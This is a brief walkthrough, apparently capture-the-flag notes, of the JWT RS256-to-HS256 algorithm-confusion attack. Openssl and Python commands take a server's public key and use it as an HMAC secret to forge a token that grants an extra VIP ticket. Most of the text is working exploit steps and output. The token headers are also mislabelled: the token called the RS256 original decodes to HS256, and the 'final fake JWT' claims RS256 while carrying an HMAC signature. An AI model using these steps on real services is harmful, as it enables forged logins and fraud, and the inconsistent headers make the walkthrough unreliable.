# RS256 to HS256 trick

Incredible tutorial: <https://habr.com/en/articles/450054/>

Here is our original JWT that is signed with RS256. Let's try to fake the key validation using the HS256 technique:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG50aGVhZG1pbjEyNCIsImJpbGxldHMiOnsiVklQIjowLCJMYXRlcmFsZSI6NCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MX0sImlhdCI6MTcxMzg5MDc0N30.xX3pvpLPTvPigseMS3lcqZI12xGs2F5FQSeZ6NAujmc
```

Modified for HS256 + 1 VIP ticket:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG50aGVhZG1pbjEyNCIsImJpbGxldHMiOnsiVklQIjoxLCJMYXRlcmFsZSI6NCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MX0sImlhdCI6MTcxMzg5MDc0N30
```

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
cat pubkey.pem | xxd -p | tr -d "\\n"
# 2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43415145417859796547486f477879304e386b375a444c45520a7a717034336e6547593679356d494f34746762696e647837614b3177476c56697933644342793145713050676c585831377051744448357477726c495347724e0a486a496a777854792b49534356785038746e3361586b313945494a315a54456c643372457449336768444c666d5244526b495a2b5556447653426d5a68307a390a466f4c54344a50612b6748434d43394965446566656a756a2b396f335a6b34766963705843344e3756644b783268447a763557747972457649734f51664b61750a637a72436c59384c63516a4a7633684851465a32527658325367357176522b714854726c433277554533385656705165617148506578663249465534656542720a71502b432f554e585259454f6d6841546253457666544a5a45575052365651487062374a6c373342505a72714a416164704e6f3333654e4735613945704734790a6e774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```

```bash
echo -n "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG50aGVhZG1pbjEyNCIsImJpbGxldHMiOnsiVklQIjoxLCJMYXRlcmFsZSI6NCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MX0sImlhdCI6MTcxMzg5MDc0N30" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43415145417859796547486f477879304e386b375a444c45520a7a717034336e6547593679356d494f34746762696e647837614b3177476c56697933644342793145713050676c585831377051744448357477726c495347724e0a486a496a777854792b49534356785038746e3361586b313945494a315a54456c643372457449336768444c666d5244526b495a2b5556447653426d5a68307a390a466f4c54344a50612b6748434d43394965446566656a756a2b396f335a6b34766963705843344e3756644b783268447a763557747972457649734f51664b61750a637a72436c59384c63516a4a7633684851465a32527658325367357176522b714854726c433277554533385656705165617148506578663249465534656542720a71502b432f554e585259454f6d6841546253457666544a5a45575052365651487062374a6c373342505a72714a416164704e6f3333654e4735613945704734790a6e774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
# SHA2-256(stdin)= 6794689e1a6205db820596012de9147c75da5e18ccfc0816b96d542cdc6aa4da
```

```bash
python -c 'import base64, binascii; print(base64.urlsafe_b64encode(binascii.a2b_hex("6794689e1a6205db820596012de9147c75da5e18ccfc0816b96d542cdc6aa4da")).decode().replace("=",""))'
# Z5RonhpiBduCBZYBLekUfHXaXhjM_AgWuW1ULNxqpNo
```

Final fake JWT:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkpvaG50aGVhZG1pbjEyNCIsImJpbGxldHMiOnsiVklQIjoxLCJMYXRlcmFsZSI6NCwiRmFtaWxpYWxlIjowLCJFc3QiOjAsIk91ZXN0IjowLCJOb3JkIGV0IFN1ZCI6MX0sImlhdCI6MTcxMzg5MDc0N30.Z5RonhpiBduCBZYBLekUfHXaXhjM_AgWuW1ULNxqpNo
```
